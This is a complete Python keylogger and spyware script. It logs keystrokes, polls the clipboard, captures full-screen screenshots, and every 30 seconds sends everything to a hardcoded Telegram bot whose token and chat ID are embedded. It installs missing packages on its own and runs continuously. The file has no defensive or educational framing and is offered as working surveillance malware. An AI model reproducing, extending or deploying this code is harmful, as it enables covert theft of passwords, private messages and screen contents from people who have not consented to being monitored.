import os
import subprocess
import threading
import io
import requests
from pynput import keyboard
import pyperclip

try:
    import mss
    from PIL import Image
except ImportError:
    subprocess.check_call(['pip', 'install', 'mss', 'pillow'])
    import mss
    from PIL import Image

bot_token = '7762380331:AAEDulbHavLQ03z4k-QVBZbKcPbde5OpPKs' #Telegram
chat_id = '1929750150'     #Telegram
loggedKeys = []
last_clipboard = ""

specialKeys = {
    "space": " ",
    "enter": "\n",
    "tab": "\t",
    "backspace": "[BS]",
    "shift": "[SHIFT]",
    "ctrl": "[CTRL]",
    "alt": "[ALT]",
    "esc": "[ESC]",
    "caps_lock": "[CAPS]",
    "cmd": "[CMD]",
    "delete": "[DEL]",
    "up": "↑",
    "down": "↓",
    "left": "←",
    "right": "→",
    "f1": "[F1]", "f2": "[F2]", "f3": "[F3]", "f4": "[F4]", "f5": "[F5]",
    "f6": "[F6]", "f7": "[F7]", "f8": "[F8]", "f9": "[F9]", "f10": "[F10]",
    "f11": "[F11]", "f12": "[F12]"
}


def send_to_telegram(text):
    requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage',
                  data={'chat_id': chat_id, 'text': text})


def send_keys():
    if loggedKeys:
        data = ''.join(loggedKeys)
        chunks = [data[i:i + 4000] for i in range(0, len(data), 4000)]
        for chunk in chunks:
            send_to_telegram(chunk)
        loggedKeys.clear()


def send_clipboard():
    global last_clipboard
    try:
        clip = pyperclip.paste()
        if clip and clip != last_clipboard:
            last_clipboard = clip
            send_to_telegram(f"[CLIPBOARD]\n{clip}")
    except Exception:
        pass


def send_screenshot():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Full screen
            screenshot = sct.grab(monitor)
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            buffer.seek(0)

            requests.post(
                f'https://api.telegram.org/bot{bot_token}/sendPhoto',
                data={'chat_id': chat_id},
                files={'photo': ('screenshot.png', buffer)}
            )
    except Exception as e:
        send_to_telegram(f"[SCREENSHOT ERROR] {e}")


def periodic_task():
    send_keys()
    send_clipboard()
    send_screenshot()
    threading.Timer(30, periodic_task).start()


def on_press(key):
    try:
        loggedKeys.append(key.char)
    except AttributeError:
        name = str(key).split('.')[-1]
        loggedKeys.append(specialKeys.get(name, f"[{name.upper()}]"))


# Start everything
periodic_task()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

     